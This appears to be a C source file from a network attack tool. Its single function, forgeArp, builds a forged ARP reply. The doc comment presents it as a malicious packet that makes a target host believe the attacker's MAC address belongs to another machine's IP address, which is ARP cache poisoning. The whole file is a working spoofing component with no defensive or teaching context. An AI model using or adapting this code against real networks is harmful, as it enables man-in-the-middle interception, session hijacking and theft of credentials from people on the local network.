#include "arp.h"

#include <arpa/inet.h>
#include <string.h>

/*
 * Crafts a malicious arp packet. Will make the host specified by dstIp and dstMac believe that
 * srcIp has the mac address atkMac.
 *
 * Params:
 *      const unsigned char *atkMac: The mac address of the attacker machine.
 *
 *      const struct in_addr *srcIp: The ip address of the machine the attacker will pose as.
 *
 *      const unsigned char *dstMac: The mac address of the destination host to trick.
 *
 *      const struct in_addr *dstIp: The ip address of the destination host to trick.
 *
 *      arphdr_t arpPkt: The arp packet header to fill.
 */
void forgeArp(const unsigned char *atkMac, const struct in_addr *srcIp, const unsigned char *dstMac,
              const struct in_addr *dstIp, struct arp_header *arpPkt) {
    arpPkt->arp_hd = htons(ARPHRD_ETHER);
    arpPkt->arp_pr = htons(ETH_P_IP);
    arpPkt->arp_hdl = ETH_ALEN;
    arpPkt->arp_prl = 4;
    arpPkt->arp_op = htons(ARPOP_REPLY);
    memcpy(arpPkt->arp_sha, atkMac, ETH_ALEN);
    memcpy(arpPkt->arp_spa, &srcIp->s_addr, 4);
    memcpy(arpPkt->arp_dha, dstMac, ETH_ALEN);
    memcpy(arpPkt->arp_dpa, &dstIp->s_addr, 4);
}
